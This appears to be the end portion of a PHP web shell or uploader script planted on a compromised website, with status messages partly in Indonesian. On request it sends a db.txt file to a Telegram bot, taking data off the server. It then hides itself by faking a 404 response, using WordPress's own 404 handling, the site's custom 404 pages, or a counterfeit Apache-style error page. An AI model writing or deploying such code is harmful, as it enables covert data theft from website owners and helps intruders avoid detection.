    echo "\n⏭️ Telegram notification skipped (cooldown active)\n";
}

if (isset($_GET['senddb']) && $_GET['senddb'] == '1') {
    $domain = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'unknown';
    $caption = "📄 <b>db.txt Backup</b>\n🌐 {$domain}\n⏰ " . date('Y-m-d H:i:s');
    
    if (sendTelegramDocument($telegramBotToken, $telegramChatId, $outputFile, $caption)) {
        echo "\n✅ db.txt sent to Telegram!\n";
    } else {
        echo "\n❌ Failed to send db.txt\n";
    }
}

echo "\n========================================\n";
echo "SELESAI! Proses upload selesai.\n";
echo "Lihat detail di: $outputFile\n";
echo "========================================\n";

if (!$showOutput) {
    ob_end_clean();
    
    // Try to trigger real 404 by including WordPress 404 or default server 404
    if (file_exists($webRoot . '/index.php')) {
        // Check if WordPress
        $indexContent = @file_get_contents($webRoot . '/index.php');
        if ($indexContent && strpos($indexContent, 'wp-blog-header') !== false) {
            // WordPress detected, trigger WP 404
            $_SERVER['REQUEST_URI'] = '/nonexistent-page-' . md5(time());
            http_response_code(404);
            
            @define('WP_USE_THEMES', true);
            @require($webRoot . '/wp-blog-header.php');
            exit;
        }
    }
    
    // Check if custom 404.php or 404.html exists
    $custom404Files = [
        $webRoot . '/404.php',
        $webRoot . '/404.html',
        $webRoot . '/404.shtml',
        dirname(__FILE__) . '/404.php',
        dirname(__FILE__) . '/404.html'
    ];
    
    foreach ($custom404Files as $file404) {
        if (file_exists($file404)) {
            http_response_code(404);
            include($file404);
            exit;
        }
    }
    
    // Fallback: Generic 404 that looks like common hosting providers
    http_response_code(404);
    header('Content-Type: text/html; charset=UTF-8');
    
    $serverSoftware = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Apache';
    $requestUri = isset($_SERVER['REQUEST_URI']) ? htmlspecialchars($_SERVER['REQUEST_URI']) : '/';
    $serverName = isset($_SERVER['SERVER_NAME']) ? htmlspecialchars($_SERVER['SERVER_NAME']) : 'localhost';
    
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ' . $requestUri . ' was not found on this server.</p>
<hr>
<address>' . $serverSoftware . ' Server at ' . $serverName . '</address>
</body></html>';
}
